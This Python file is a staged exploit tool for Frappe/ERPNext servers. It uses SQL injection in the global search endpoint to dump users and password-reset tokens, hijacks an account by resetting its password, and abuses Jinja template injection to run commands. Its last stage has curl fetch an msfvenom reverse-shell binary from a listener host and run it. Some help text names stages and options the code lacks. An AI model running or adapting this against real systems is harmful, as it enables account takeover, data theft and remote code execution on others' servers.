import sys
import re
import os
import base64
import hashlib
import requests
import threading
import urllib.parse
import argparse
import zipfile
import time
import random
import string
import itertools
import warnings
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import Fore, Style

warnings.filterwarnings("ignore")
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def format_text(title, item):
    text = Style.BRIGHT + Fore.RED + title + Style.RESET_ALL + ': ' + str(item)
    return text

def verify(ip):
    url = 'http://%s:8000' % ip
    data = {
        'cmd': 'frappe.utils.global_search.web_search',
        'text': 'hahaha',
        'scope': '123123hahaha" UNION ALL SELECT 1,2,3,4,"hacked2024"#'
    }
    r = requests.post(url, data=data, proxies=proxies)
    if "hacked2024" in r.text:
        print("[+] The target is vulnerable to SQL injection!")
    else:
        print("[+] The target is not vulnerable to SQL injection...")

def get_collation(ip, verbose=True):
    if verbose:
        print("[+] Retrieving the collabtion of each of the five parameters...")

    collation_list = []
    url = 'http://%s:8000' % ip
    queries = [
    '123123hahaha" UNION ALL SELECT COLLATION_NAME,2,3,4,5 FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#',
    '123123hahaha" UNION ALL SELECT 1,COLLATION_NAME,3,4,5 FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#',
    '123123hahaha" UNION ALL SELECT 1,2,COLLATION_NAME,4,5 FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#',
    '123123hahaha" UNION ALL SELECT 1,2,3,COLLATION_NAME,5 FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#',
    '123123hahaha" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#'
    ]
    for i in range(0, len(queries)):
        data = {
        'cmd': 'frappe.utils.global_search.web_search',
        'text': 'hahaha',
        'scope': queries[i]
        }
        r = requests.post(url, data=data, proxies=proxies)
        if i == 0:
            collation_list.append(r.text.split('"doctype":"')[1].split('"')[0])
        elif i == 1:
            collation_list.append(r.text.split('"name":"')[1].split('"')[0])
        elif i == 2:
            collation_list.append(r.text.split('"content":"')[1].split('"')[0])
        elif i == 3:
            collation_list.append(r.text.split('"title":"')[1].split('"')[0])
        elif i == 4:
            collation_list.append(r.text.split('"route":"')[1].split('"')[0])

    if verbose:
        for i in range(0, len(collation_list)):
            print("[+] The collation at position %d is %s" % (i+1, collation_list[i]))

    return collation_list

def get_users(ip, verbose=True):
    print("[+] Getting valid users in ERPNext...")
    collation_list = get_collation(ip, verbose=False)
    url = 'http://%s:8000' % ip
    data = {
        'cmd': 'frappe.utils.global_search.web_search',
        'text': 'hahaha',
        'scope': '123123hahaha" UNION ALL SELECT 1,2,3,4,name COLLATE %s FROM __Auth#' % collation_list[4]
    }
    r = requests.post(url, data=data, proxies=proxies)
    users = [i.split('"')[0] for i in r.text.split('"route":"')[1:]]

    if verbose:
        print("[+] The users in ERPNext are %s." % ", ".join(users))

    return users

def get_reset_password_token(ip, verbose=True):
    collation_list = get_collation(ip, verbose=False)
    users = get_users(ip, verbose=False)
    valid_users = [user for user in users if '@' in user]

    poc_user = valid_users[0]
    print("[+] Picked %s to perform reset password!" % poc_user)

    print("[+] Triggering the reset password request...")
    url = 'http://%s:8000' % ip
    data = {
        'cmd': 'frappe.core.doctype.user.user.reset_password',
        'user': poc_user
    }
    r = requests.post(url, data=data, proxies=proxies)

    print("[+] Retrieving the reset password token...")
    data = {
        'cmd': 'frappe.utils.global_search.web_search',
        'text': 'hahaha',
        'scope': '123123hahaha" UNION ALL SELECT 1,2,3,name COLLATE %s,reset_password_key COLLATE %s FROM tabUser WHERE name="%s"#' % (collation_list[3],collation_list[4],poc_user)
    }
    r = requests.post(url, data=data, proxies=proxies)
    token = r.text.split('"route":"')[1].split('"')[0]

    if verbose:
        print("[+] The reset password token of %s is %s" % (poc_user, token))
        print("[+] You can now reset password at http://%s:8000/update-password?key=%s" % (ip,token))

    return poc_user, token

def reset_password(ip):
    poc_user, token = get_reset_password_token(ip, verbose=False)
    password = 'P@ssw0rd@2024'

    url = 'http://%s:8000' % ip
    headers = {'Cookie': 'user_image=; user_id=Guest; sid=Guest; full_name=Guest; system_user=yes'}
    data = {
        'key': token,
        'old_password': password,
        'new_password': password,
        'logout_all_sessions': '1',
        'cmd': 'frappe.core.doctype.user.user.update_password'
    }
    r = requests.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=False)
    session = 'sid=' + r.headers['Set-Cookie'].split('sid=')[1].split(';')[0]
    print("[+] The new password of %s is %s" % (poc_user, password))

    return session

def do_ssti(ip, command, headers, verbose=True):
    random_template_name = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    if verbose:
        print('[+] Created a template named "%s".' % random_template_name)

    template_string = '{"docstatus":0,"doctype":"Email Template","name":"' + random_template_name
    template_string += '","__islocal":1,"__unsaved":1,"owner":"zeljka.k@randomdomain.com","__newname":"' + random_template_name
    template_string += '","subject":"' + random_template_name
    template_string += '","response":"<div>{%' + ' set string = \\"ssti\\" %}</div><div>{%' + ' set class = \\"__class__\\" %}</div><div>{%'
    template_string += ' set mro = \\"__mro__\\" %}</div><div>{%' + ' set subclasses = \\"__subclasses__\\" %}</div><div>{%'
    template_string += ' set mro_r = string|attr(class)|attr(mro) %}</div><div>{%' + ' set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{'
    template_string += '{ ' + command + ' }' + '}</div>"}'
    url = 'http://%s:8000/api/method/frappe.desk.form.save.savedocs' % ip
    data = {
        'doc': template_string,
        'action': 'Save'
    }
    r = requests.post(url, headers=headers, data=data, proxies=proxies)

    template_string_2 = '{"idx":0,"subject":"' + random_template_name + '","doctype":"Email Template","name":"' + random_template_name
    template_string_2 += '","response":"<div>{%' + ' set string = \\"ssti\\" %}</div><div>{%' + ' set class = \\"__class__\\" %}</div><div>{%' 
    template_string_2 += ' set mro = \\"__mro__\\" %}</div><div>{%' + ' set subclasses = \\"__subclasses__\\" %}</div><div>{%'
    template_string_2 += ' set mro_r = string|attr(class)|attr(mro) %}</div><div>{%' + ' set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{'
    template_string_2 += '{ ' + command + ' }' + '}</div>"}'
    url = 'http://%s:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template' % ip
    data = {
        'template_name': random_template_name,
        'doc': template_string_2,
        'action': 'Save'
    }
    r = requests.post(url, headers=headers, data=data, proxies=proxies)

    return r.text

def get_subprocess_index(ip):
    session = reset_password(ip)
    url = 'http://%s:8000/desk' % ip
    headers = {'Cookie': session}
    r = requests.get(url, headers=headers, proxies=proxies)
    csrf_token = r.text.split('frappe.csrf_token = "')[1].split('"')[0]

    headers = {'Cookie': session, 'X-Frappe-CSRF-Token': csrf_token}
    command = 'subclasses_r'
    raw_class_list = do_ssti(ip, command, headers)
    class_list = raw_class_list.split(']</div>","subject":"')[0].split('</div><div></div><div></div><div></div><div>[<class ')[1].split(', <class')
    subprocess_index = next((index for index, subclass in enumerate(class_list) if 'subprocess.Popen' in subclass), None) + 7

    print('[+] Locating the index...')
    for i in range(subprocess_index - 15, subprocess_index + 15):
        command = 'subclasses_r[%d]' % i
        if 'subprocess.Popen' in do_ssti(ip, command, headers, False):
            print('[+] subprocess.Popen is at index %d!' % subprocess_index)
            return i, headers
    
    print('[-] Failed to locate the subprocess index...')
    return -1, -1

def get_reverse_shell(ip, listener_ip):
    subprocess_index, headers = get_subprocess_index(ip)

    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener ip> LPORT=4444 -f elf -o reverse.elf
    # python3 -m http.server 80
    if subprocess_index != -1:

        print("[+] Downloading reverse shell from http://%s/reverse.elf" % listener_ip)
        # /usr/bin/curl <listener ip>/reverse.elf -o /tmp/reverse.elf
        command = 'subclasses_r[%d]([\\"/usr/bin/curl\\",\\"%s/reverse.elf\\",\\"-o\\",\\"/tmp/reverse.elf\\"])' % (subprocess_index, listener_ip)
        do_ssti(ip, command, headers, verbose=False)

        # /bin/chmod 777 /tmp/reverse.elf
        command = 'subclasses_r[%d]([\\"/bin/chmod\\",\\"777\\",\\">\\",\\"/tmp/reverse.elf\\"])' % (subprocess_index)
        do_ssti(ip, command, headers, verbose=False)

        print("[+] Triggered the reverse shell!")
        # /tmp/reverse.elf
        command = 'subclasses_r[%d]([\\"/tmp/reverse.elf\\"])' % (subprocess_index)
        do_ssti(ip, command, headers, verbose=False)

class NewlineFormatter(argparse.RawTextHelpFormatter):
    def _split_lines(self, text, width):
        if text.startswith('R|'):
            return text[2:].splitlines()  
        return argparse.RawTextHelpFormatter._split_lines(self, text, width)

def main():
    parser = argparse.ArgumentParser(description='''
    Usage examples:
      - To execute JavaScript command:
        python script.py -i <IP> -s inject_command -c <some JS command>
      - To get a reverse shell:
        python script.py -i <IP> -s get_reverse_shell -l <Listener IP>

    The script supports the following stages:
      - "inject_command": Inject and execute JavaScript command
      - "get_reverse_shell": Get a reverse shell by injecting reverse shell payload
      - "get_reverse_shell_harden": Get a reverse shell from the harden eval() which uses safe-eval. Bypass it with CVE-2017-16088
    ''', formatter_class=NewlineFormatter)
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP Address is mandatory')
    parser.add_argument('-s', '--stage', type=str, help='Stage')
    parser.add_argument('-l', '--listener', type=str, help='Listener IP')
    args = parser.parse_args()
    
    if not args.ip:
        parser.print_usage()
        exit(1)

    if args.stage == "inject_command" and not args.command:
        parser.print_usage()
        exit(1)

    elif args.stage == "get_reverse_shell" and not args.listener:
        parser.print_usage()
        exit(1)

    elif args.ip and args.stage:
        ip = args.ip
        stage = args.stage

        if stage == "verify":
            verify(ip)

        elif stage == "get_collation":
            get_collation(ip)

        elif stage == "get_users":
            get_users(ip)

        elif stage == "get_reset_password_token":
            get_reset_password_token(ip)

        elif stage == "reset_password":
            reset_password(ip)

        elif stage == "get_subprocess_index":
            get_subprocess_index(ip)

        elif stage == "get_reverse_shell":
            listener_ip = args.listener
            get_reverse_shell(ip, listener_ip)

    else:
        verify(ip)
    

if __name__ == "__main__":
    main()
